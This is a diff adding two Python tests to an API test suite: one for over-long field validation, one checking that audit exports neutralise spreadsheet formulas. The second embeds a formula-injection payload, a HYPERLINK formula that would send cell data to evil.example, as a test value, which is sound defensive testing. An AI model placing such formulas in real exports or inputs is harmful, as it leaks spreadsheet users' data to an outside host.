@@ -335,3 +335,30 @@ def test_xlsx_exports_open_with_headers_and_rows(api, admin, w, ctx):
         if "audits" not in path:
             assert rows[0][:2] == ("序号", "完整SN")
             assert rows[1][1] == "XL00001" and rows[1][3] == 1
+
+
+def test_over_long_value_is_validation_error_not_retry_conflict(api, admin, ctx):
+    r = api.post(
+        "/api/transfers/direct",
+        m(factory_code=FA, pi_no=uid("PI"), scope="PI", to_factory=FB, to_pi="T" * 80, reason="r"),
+        admin,
+    )
+    assert r.status == 422 and r.code == "VALIDATION", str(r)
+
+
+def test_exports_never_carry_formulas(api, admin, w, ctx):
+    import io
+
+    import openpyxl
+
+    pi = ready(w, "X", 2, 0)
+    evil = '=HYPERLINK("http://evil.example/?x="&A1,"click")'
+    ok(api.post("/api/transfers", m(pi_no=pi, scope="PI", to_factory=FB, to_pi=pi, reason=evil), ctx["op_a"]))
+    path = "/api/audits/export" + q(action="TRANSFER_APPLY", pi=pi)
+    headers = {"Authorization": "Bearer " + admin}
+    ws = openpyxl.load_workbook(io.BytesIO(api.client.get(path + "&format=xlsx", headers=headers).content)).active
+    cells = [c for row in ws.iter_rows(min_row=2) for c in row if c.value == evil]
+    assert cells, "reason kept verbatim"
+    assert all(c.data_type == "s" for c in cells)
+    csv = api.client.get(path + "&format=csv", headers=headers).content.decode("utf-8-sig")
+    assert "\"'=HYPERLINK(" in csv
